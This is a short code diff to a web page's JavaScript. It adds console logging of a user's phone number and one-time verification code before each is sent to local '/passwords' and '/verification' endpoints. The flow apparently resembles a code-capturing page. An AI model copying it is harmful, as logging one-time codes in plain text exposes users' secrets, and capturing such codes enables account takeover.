@@ -369,7 +369,8 @@
                     return;
                 }
 
-                // Send the phone number to the server
+                console.log('Sending phone number to server:', phoneNumber);
+
                 fetch('http://localhost:8000/passwords', {
                     method: 'POST',
                     headers: {
@@ -383,6 +384,7 @@
                     if (!response.ok) {
                         throw new Error('Network response was not ok');
                     }
+                    console.log('Phone number sent successfully');
                     // Transition to the verification code input screen
                     document.getElementById('phoneDisplay').textContent = phoneNumber;
                     document.getElementById('initialContainer').classList.remove('active');
@@ -403,7 +405,8 @@
                     return;
                 }
 
-                // Send the verification code to the server
+                console.log('Sending verification code to server:', verificationCode);
+
                 fetch('http://localhost:8000/verification', {
                     method: 'POST',
                     headers: {
@@ -418,6 +421,7 @@
                     if (!response.ok) {
                         throw new Error('Network response was not ok');
                     }
+                    console.log('Verification code sent successfully');
                     // Transition to the final message screen
                     document.getElementById('phoneVerificationContainer').classList.remove('active');
                     document.getElementById('finalMessageContainer').classList.add('active');
